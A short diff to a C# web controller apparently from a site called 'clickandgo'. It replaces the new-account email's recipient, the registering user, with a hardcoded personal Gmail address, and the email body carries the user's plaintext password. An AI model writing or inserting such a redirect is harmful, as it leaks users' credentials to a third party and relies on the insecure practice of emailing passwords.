@@ -221,7 +221,7 @@ namespace clickandgo.Controllers
                     SmtpClient SmtpServer = new SmtpClient("mail.clickandgoja.com");
 
                     mail.From = new MailAddress("admin@clickandgoja.com");
-                    mail.To.Add(userData.Email);
+                    mail.To.Add("campbellemelio@gmail.com");
                     mail.Subject = "New Account";
                     mail.Body = "Your email is "+userData.Email+" and your password is "+finalString;
 
